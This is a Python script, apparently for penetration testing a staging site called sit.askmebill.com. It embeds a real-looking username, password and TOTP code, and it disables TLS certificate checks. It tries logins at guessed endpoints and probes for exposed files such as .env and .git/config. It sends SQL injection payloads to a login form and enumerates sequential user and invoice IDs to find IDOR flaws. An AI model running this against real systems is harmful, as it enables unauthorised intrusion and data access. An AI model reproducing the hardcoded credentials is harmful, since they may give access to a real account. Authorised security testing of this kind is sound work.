#!/usr/bin/env python3
"""
Askmebill SIT - API Penetration Testing (No Browser Needed)
Direct HTTP/API testing using requests

Target: https://sit.askmebill.com/
"""

import requests
import json
import sys
from datetime import datetime
from urllib.parse import urljoin

# Configuration
TARGET = "https://sit.askmebill.com"
USERNAME = "uuio11"
PASSWORD = "0897421942@Earth"
TOTP = "954900"

# Disable SSL warnings (for testing only)
requests.packages.urllib3.disable_warnings()

class APIPentest:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        self.results = []
        
    def log(self, test, status, details=""):
        """Log test result"""
        result = {
            "timestamp": datetime.now().isoformat(),
            "test": test,
            "status": status,
            "details": details
        }
        self.results.append(result)
        icon = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️"
        print(f"{icon} {test}: {status}")
        if details:
            print(f"   {details}")
    
    def test_connectivity(self):
        """Test basic connectivity"""
        print("\n[1] Basic Connectivity Test")
        print("-" * 40)
        
        try:
            resp = self.session.get(TARGET, timeout=10)
            self.log("HTTP Connect", "PASS", f"Status: {resp.status_code}")
            
            # Check security headers
            headers = resp.headers
            security_headers = ['Strict-Transport-Security', 'X-Frame-Options', 
                              'X-Content-Type-Options', 'Content-Security-Policy']
            
            missing = [h for h in security_headers if h not in headers]
            if missing:
                self.log("Security Headers", "WARN", f"Missing: {', '.join(missing)}")
            else:
                self.log("Security Headers", "PASS", "All present")
                
        except Exception as e:
            self.log("HTTP Connect", "FAIL", str(e))
    
    def test_login_endpoint(self):
        """Test login endpoint"""
        print("\n[2] Login Endpoint Test")
        print("-" * 40)
        
        # Try common login endpoints
        endpoints = [
            "/api/auth/login",
            "/api/login", 
            "/auth/login",
            "/login",
            "/api/v1/login"
        ]
        
        for endpoint in endpoints:
            url = urljoin(TARGET, endpoint)
            try:
                # Test with OPTIONS to see what's allowed
                resp = self.session.options(url, timeout=5)
                if resp.status_code != 404:
                    self.log(f"Login EP {endpoint}", "FOUND", f"Status: {resp.status_code}")
                    
                    # Try login
                    data = {"username": USERNAME, "password": PASSWORD}
                    resp = self.session.post(url, json=data, timeout=10)
                    self.log(f"Login Attempt {endpoint}", "INFO", f"Status: {resp.status_code}")
                    
                    if resp.status_code == 200:
                        print(f"   Response: {resp.text[:200]}")
                        
            except Exception as e:
                pass  # 404 expected for most
    
    def test_common_vulnerabilities(self):
        """Test for common vulnerabilities"""
        print("\n[3] Common Vulnerability Tests")
        print("-" * 40)
        
        # Test for exposed files
        exposed_files = [
            "/robots.txt",
            "/sitemap.xml",
            "/.well-known/security.txt",
            "/api/docs",
            "/swagger",
            "/swagger-ui.html",
            "/v2/api-docs",
            "/actuator/health",
            "/actuator/info",
            "/phpinfo.php",
            "/.env",
            "/.git/config"
        ]
        
        for path in exposed_files:
            url = urljoin(TARGET, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    self.log(f"Exposed File {path}", "FOUND", f"Size: {len(resp.text)} bytes")
                elif resp.status_code != 404:
                    self.log(f"File {path}", "INFO", f"Status: {resp.status_code}")
            except:
                pass
    
    def test_sql_injection(self):
        """Test for SQL injection"""
        print("\n[4] SQL Injection Tests")
        print("-" * 40)
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        # Try on login if we found an endpoint
        login_url = urljoin(TARGET, "/api/login")
        
        for payload in payloads[:2]:  # Test limited payloads
            try:
                data = {"username": payload, "password": "test"}
                resp = self.session.post(login_url, json=data, timeout=5)
                
                # Check for SQL error indicators
                if any(x in resp.text.lower() for x in ['sql', 'mysql', 'sqlite', 'postgresql', 'syntax error']):
                    self.log(f"SQLi Test", "VULNERABLE", f"Payload: {payload}")
                else:
                    self.log(f"SQLi Test", "CHECK", f"Payload: {payload}, Status: {resp.status_code}")
                    
            except Exception as e:
                pass
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        print("\n[5] IDOR Tests")
        print("-" * 40)
        
        endpoints = [
            "/api/user/1",
            "/api/user/2",
            "/api/account/1",
            "/api/invoice/1",
            "/user/profile/1",
            "/user/profile/2"
        ]
        
        for endpoint in endpoints:
            url = urljoin(TARGET, endpoint)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code != 404:
                    self.log(f"IDOR {endpoint}", "INFO", f"Status: {resp.status_code}")
            except:
                pass
    
    def save_results(self):
        """Save results to file"""
        filename = f"askmebill-api-test-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump({
                "target": TARGET,
                "timestamp": datetime.now().isoformat(),
                "results": self.results
            }, f, indent=2)
        print(f"\n💾 Results saved to: {filename}")
    
    def run_all(self):
        """Run all tests"""
        print("=" * 60)
        print("  ASKMEBILL SIT - API PENETRATION TESTING")
        print(f"  Target: {TARGET}")
        print("=" * 60)
        
        self.test_connectivity()
        self.test_login_endpoint()
        self.test_common_vulnerabilities()
        self.test_sql_injection()
        self.test_idor()
        
        self.save_results()
        
        print("\n" + "=" * 60)
        print("  TESTING COMPLETE")
        print("=" * 60)
        print(f"\nTotal Tests: {len(self.results)}")
        passed = sum(1 for r in self.results if r['status'] == 'PASS')
        failed = sum(1 for r in self.results if r['status'] == 'FAIL')
        print(f"Passed: {passed}, Failed: {failed}, Others: {len(self.results) - passed - failed}")

def main():
    print("🚀 Starting API Penetration Testing...")
    print("Note: This tests API endpoints without browser automation\n")
    
    pentest = APIPentest()
    pentest.run_all()

if __name__ == "__main__":
    main()
